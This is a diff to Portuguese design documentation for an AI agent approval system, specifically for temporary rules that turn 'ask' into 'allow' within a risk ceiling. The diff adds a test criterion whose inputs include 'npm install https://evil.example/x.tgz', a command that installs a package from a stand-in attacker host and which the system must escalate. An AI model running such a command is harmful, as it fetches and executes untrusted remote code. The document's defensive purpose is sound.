@@ -11,7 +11,7 @@ Deixar um agente da [cadeia de aprovação](cadeia-de-aprovacao.md) liberar por 
 ### O que é e quem cria
 
 - Nasce de uma resposta de agente a um pedido: **Aprovar por um tempo** (a ação exata) ou **Aprovar o padrão** (um [padrão aprovável](../classes/classificacao-de-risco.md#padrões-aprováveis)) ([respostas](cadeia-de-aprovacao.md#respostas)).
-- Quem cria: o Mestre da mesa, só na própria mesa; o Grão-Mestre, na mesa do pedido. Só o que o nível dele pode decidir: o risco da ação ou do padrão cabe no teto dele (com as delegações que tiver) e passa pelas [salvaguardas](cadeia-de-aprovacao.md#salvaguardas).
+- Quem cria: o Mestre da mesa, só na própria mesa e só de risco `baixo` (o `medio` dele se decide pedido a pedido, com as [condições da mesa](cadeia-de-aprovacao.md#condições-da-mesa)); o Grão-Mestre, na mesa do pedido. Só o que o nível dele pode decidir: o risco da ação ou do padrão cabe no teto dele (com as delegações que tiver) e passa pelas [salvaguardas](cadeia-de-aprovacao.md#salvaguardas).
 - **Conteúdo:** o alvo (ação ou padrão, com a impressão), o tipo de ferramenta, a classe de quem pediu e a mesa (vale para os personagens dessa classe naquela mesa), o autor e o nível, o pedido de origem, o risco, a criação e a validade.
 - Fica no banco da Cidadela (tabela `table_rules`, [persistência](../arquitetura/persistencia.md)), com histórico de estados (`ativa` → `expirada` | `revogada` | `suspensa`) e a lista do que foi liberado com base nela.
 
@@ -24,6 +24,7 @@ Deixar um agente da [cadeia de aprovação](cadeia-de-aprovacao.md) liberar por 
 ### Lugar na precedência
 
 - Abaixo das regras fixas e dos decretos de pessoas; acima das regras da classe naquela mesa ([precedência](../arquitetura/precedencia.md#a-ordem)).
+- **Só cobre o que cabe no risco dela:** a regra vale para um comando que o padrão casa **e** cuja classificação própria cabe no risco da regra (`PatternCovers`, [o que um padrão cobre](../classes/classificacao-de-risco.md#padrões-aprováveis)); `npm install *` aprovado como `baixo` não libera `npm install -g x` (`medio`), que segue como pedido.
 - **Só transforma `ask` em `allow`:** uma ação que alguma camada (classe, teto, ficha) nega continua negada; um decreto de pessoa que proíbe a ação vence. Exceções pontuais e decretos de pessoas que liberam não precisam dela.
 - Chega ao personagem nas [regras efetivas](../classes/permissoes.md#regras-efetivas), na lista `decrees`, com `kind: "table_rule"`, `level` do autor (`table_master` ou `grand_master`), o efeito `permission` (`allow` de `commands` ou `tools`) e `until`; a decisão a aplica na própria máquina, como os decretos. Não vira regra nativa e, como as exceções pontuais, não vale em [modo degradado](../classes/permissoes.md#modo-degradado).
 - Ao liberar uma ação, o motor registra a execução na regra (ação, quando, quem).
@@ -48,6 +49,7 @@ Deixar um agente da [cadeia de aprovação](cadeia-de-aprovacao.md) liberar por 
 - **CA-RTM-03** · *rápida* — **Dado** o Mestre da mesa, **quando** pede uma regra temporária de 48 h, uma em outra mesa ou uma para um padrão `medio`, **então** as três são recusadas e o pedido segue no nível dele.
 - **CA-RTM-04** · *rápida* — **Dado** uma regra temporária "até o fim da missão", **quando** a missão termina ou a mesa é encerrada, **então** ela fica `expirada` e o autor é avisado; **quando** o Grão-Mestre revoga outra, **então** ela fica `revogada` e a próxima ação volta a pedir.
 - **CA-RTM-05** · *rápida* — **Dado** uma regra temporária ativa, **quando** a Cidadela monta as regras efetivas do personagem, **então** o documento traz em `decrees` um item `kind: "table_rule"`, `level: "table_master"`, `until` e o padrão em `allow.commands`, e o retrato `policy.json` do modo degradado não o usa para liberar nada.
+- **CA-RTM-06** · *rápida* — **Dado** uma regra temporária do Mestre da mesa para `npm install *` (`baixo`), **quando** chegam `npm install y`, `npm install -g x` e `npm install https://evil.example/x.tgz`, **então** o primeiro passa pela regra e os outros dois (`medio`) viram pedido que nasce no Grão-Mestre, sem registro de execução na regra.
 
 ## Depende de
 
